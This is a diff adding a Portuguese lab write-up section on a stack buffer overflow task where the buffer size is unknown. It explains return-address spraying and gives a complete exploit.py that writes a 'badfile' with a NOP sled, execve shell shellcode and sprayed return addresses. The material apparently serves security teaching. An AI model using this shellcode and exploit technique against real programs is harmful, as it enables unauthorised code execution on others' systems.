@@ -155,3 +155,62 @@ Finalmente, corremos o `exploit.py`, que vai criar o `badfile`, seguido do `stac
 ```
 
 ## Task 4 - Launching Attack without Knowing Buffer Size (Level 2)
+
+
+Embora este exercício seja semelhante ao anterior, o facto de não sabermos o tamanho do buffer leva-nos a ter de ter uma approach diferente em relação, especialmente, ao return address. Como não é suposto sabermos o **$ebp**, não conseguimos calcular o offset e, portanto, não conseguimos dar pinpoint à localização do return address que queremos override.<br>
+Vamos, portanto, ter de recorrer a **spraying**.
+
+**Spraying** consiste em encher o buffer com o novo return address que queremos, pois, assim, mesmo não sabendo o tamanho do `buffer` e, por sua vez, o endereço do return address, como sabemos o tamanho máximo do `buffer` sabemos o endereço máximo que o antigo return address pode ocupar.
+
+O `exploit.py` ficou da seguinte forma:
+
+```py
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# Fill the content with NOP's (do nothing operation)
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0xffffcaac + 201*4
+#offset = 0xffffcb18 - 0xffffcaac + 4  # Não é necessário para este caso
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+
+for offset in range(50):
+  content[offset*L:offset*L + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+Desta vez, como não temos o **$ebp** para calcular o **ret**, usamos o endereço do início do `buffer`, devido a isto o número adicionado tem de ser maior do que o tamanho máximo do `buffer`, que é `200 * 4 = 800`, devido a ser endereços de 32 bits/4 bytes.<br>
+Portanto, o novo return address ficou com o valor:
+
+```
+ret    = 0xffffcaac + 201*4
+```
+
+Por fim, não podemos calcular onde colocar o novo return address como no exercício anterior, portanto recorremos a spraying:
+
+```
+for offset in range(50):
+  content[offset*L:offset*L + L] = (ret).to_bytes(L,byteorder='little') 
+```
+
+Este **ciclo for** vai colocar, em todos os endereços do `buffer`, o novo return address, calculado anteriormente.
